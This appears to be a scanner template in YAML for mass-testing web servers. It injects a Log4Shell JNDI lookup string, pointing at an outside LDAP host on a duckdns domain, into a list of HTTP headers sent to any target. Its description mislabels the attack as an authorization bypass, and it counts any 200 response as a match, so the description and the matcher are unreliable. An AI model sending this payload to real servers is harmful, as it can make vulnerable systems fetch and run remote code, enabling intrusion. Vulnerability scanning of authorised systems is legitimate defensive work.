id: Labda_rce_apache

info:
  name: Labda rce
  author: Labda
  description: Bypasses authorization with header modification
  tags: bypass, web, authorization, Forbidden

requests:
  - raw:
      - |+
        GET / HTTP/1.1
        Host: {{BaseURL}}
        {{header}}: ${jndi:ldap://labdalab.duckdns.org:4567/gotcha}
    payloads:
      header:
        - User-Agent
        - Date
        - Content-Type
        - Content-Encoding
        - Pragma
        - Cache-Control
        - Origin
        - Referer
        - X-Api-Version
    attack: batteringram
    unsafe: true
    matchers:
        - type: status
          status:
            - 200
